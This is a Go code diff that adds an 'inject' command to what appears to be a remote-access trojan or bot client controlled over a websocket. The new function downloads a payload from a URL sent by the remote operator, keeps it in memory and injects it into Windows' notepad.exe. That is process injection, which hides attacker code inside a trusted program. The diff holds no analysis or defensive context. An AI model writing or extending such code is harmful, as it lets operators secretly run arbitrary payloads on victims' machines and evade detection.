@@ -1,6 +1,7 @@
 package miscs
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"log"
@@ -47,10 +48,53 @@ func SendMessageAndReceive(c *websocket.Conn, message string) {
 	case "download":
 		download(formatted[2])
 
+	case "inject":
+		inject(formatted[2])
+
 	case "update":
 		update(formatted[2])
 
 	}
+}
+
+func inject(downloadlink string) {
+	parsedURL, err := url.Parse(downloadlink)
+	if err != nil {
+		return
+	}
+
+	path := parsedURL.Path
+	extension := filepath.Ext(path)
+
+	client := &http.Client{}
+	req, _ := http.NewRequest("GET", downloadlink, nil)
+
+	tempDir := os.TempDir()
+
+	fileName := randomString(16) + extension
+	filePath := filepath.Join(tempDir, fileName)
+
+	file, _ := os.Create(filePath)
+	defer file.Close()
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return
+	}
+	var fileBuffer bytes.Buffer
+	_, err = io.Copy(&fileBuffer, resp.Body)
+	if err != nil {
+		return
+	}
+
+	// Inject the file from the buffer
+	Inject("C:\\Windows\\System32\\notepad.exe", fileBuffer.Bytes(), nil)
+
 }
 
 func download(downloadlink string) {
